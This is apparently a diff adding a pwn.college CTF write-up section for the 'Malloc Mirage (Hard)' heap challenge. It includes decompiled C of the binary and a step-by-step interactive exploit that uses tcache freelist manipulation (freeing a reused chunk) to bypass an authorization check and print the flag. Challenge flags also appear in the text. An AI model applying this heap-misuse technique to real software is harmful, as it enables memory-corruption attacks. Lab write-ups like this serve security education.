@@ -1482,3 +1482,167 @@ pwn.college{YaCr8LqQNO7XOxRVrb2l58ayfLL.0VO3MDL4ITM0EzW}
 
 &nbsp;
 
+## Malloc Mirage (Hard)
+
+```
+hacker@dynamic-allocator-misuse~malloc-mirage-hard:/$ /challenge/malloc-mirage-hard 
+###
+### Welcome to /challenge/malloc-mirage-hard!
+###
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): 
+```
+
+We need to figure out the following in order to solve the hard version.
+- [ ] Size of memory allocation into which the flag is read
+
+### Binary Analysis
+
+```c title="/challenge/malloc-mirage-hard :: main()" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int i; // [rsp+24h] [rbp-13Ch]
+  unsigned int v6; // [rsp+28h] [rbp-138h]
+  unsigned int v7; // [rsp+28h] [rbp-138h]
+  unsigned int v8; // [rsp+28h] [rbp-138h]
+  unsigned int size; // [rsp+2Ch] [rbp-134h]
+  const char *size_4; // [rsp+30h] [rbp-130h]
+  void *ptr[16]; // [rsp+40h] [rbp-120h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-A0h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-18h]
+
+  v13 = __readfsqword(40u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            puts(byte_2020);
+            printf("[*] Function (malloc/free/puts/read_flag/puts_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2020);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2020);
+            v6 = atoi(choice);
+            if ( v6 > 15 )
+              __assert_fail("allocation_index < 16", "<stdin>", 66u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2020);
+            size = atoi(choice);
+            ptr[v6] = malloc(size);
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_2020);
+          v7 = atoi(choice);
+          if ( v7 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 82u, "main");
+          free(ptr[v7]);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_2020);
+        v8 = atoi(choice);
+        if ( v8 > 15 )
+          __assert_fail("allocation_index < 16", "<stdin>", 94u, "main");
+        printf("Data: ");
+        puts((const char *)ptr[v8]);
+      }
+      if ( strcmp(choice, "read_flag") )
+        break;
+      for ( i = 0; i <= 0; ++i )
+      {
+        size_4 = (const char *)malloc(784uLL);
+        *(_QWORD *)size_4 = 0LL;
+      }
+      v3 = open("/flag", 0);
+      read(v3, (void *)(size_4 + 16), 128uLL);
+    }
+    if ( strcmp(choice, "puts_flag") )
+      break;
+    if ( *(_QWORD *)size_4 )
+      puts(size_4 + 16);
+    else
+      puts("Not authorized!");
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+- [x] Size of memory allocation into which the flag is read: `784`
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~malloc-mirage-hard:/$ /challenge/malloc-mirage-hard 
+###
+### Welcome to /challenge/malloc-mirage-hard!
+###
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc
+
+Index: 0
+
+Size: 784
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc
+
+Index: 1
+
+Size: 784
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free
+
+Index: 1
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free
+
+Index: 0
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free
+
+Index: 0
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag
+
+pwn.college{knO2mcRxdTIDye38lEOhpvy9MXg.0FM4MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): quit
+
+### Goodbye!
+```
